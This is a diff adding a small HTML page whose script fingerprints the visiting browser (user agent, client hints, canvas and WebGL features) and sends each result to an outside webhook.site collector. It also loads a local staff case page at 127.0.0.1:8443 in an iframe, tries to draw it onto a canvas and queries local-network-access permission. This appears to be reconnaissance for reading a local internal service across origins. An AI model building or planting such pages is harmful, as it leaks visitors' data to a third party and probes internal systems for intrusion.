@@ -1,0 +1,21 @@
+<!doctype html><html><head><title>p12</title></head><body>p12
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+var G="https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs";
+var C="https://127.0.0.1:8443/staff/cases/BT-017";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,300));}catch(e){}}
+b("ua", navigator.userAgent);
+try{ navigator.userAgentData.getHighEntropyValues(["fullVersionList","platformVersion"]).then(function(d){
+  b("brands", JSON.stringify(d.brands)); b("full", JSON.stringify(d.fullVersionList));
+}); }catch(e){ b("uad_err", e.message); }
+var cv=document.createElement("canvas"); var ctx=cv.getContext("2d");
+b("drawElement", typeof ctx.drawElement);
+b("texElement2D", typeof (cv.getContext("webgl2")||{}).texElement2D);
+b("ctx_filter", "filter" in ctx);
+try{ ctx.filter="url(#f)"; b("filter_rw", ctx.filter); }catch(e){ b("filter_rw_err", e.message); }
+try{ var f=document.createElement("iframe"); f.src=C; document.body.append(f);
+  setTimeout(function(){ try{ ctx.drawImage(f,0,0); b("drawiframe","ok"); }catch(e){ b("drawiframe_err", e.name+":"+e.message.slice(0,80)); } },2500);
+}catch(e){ b("iframe_err", e.message); }
+b("permissions_lna", typeof navigator.permissions.query);
+setTimeout(function(){ try{ navigator.permissions.query({name:"local-network-access"}).then(function(s){b("perm_lna",s.state)},function(e){b("perm_lna_err",e.message.slice(0,80))}) }catch(e){ b("perm_lna_thr", e.message.slice(0,80)); } },1000);
+</script></body></html>
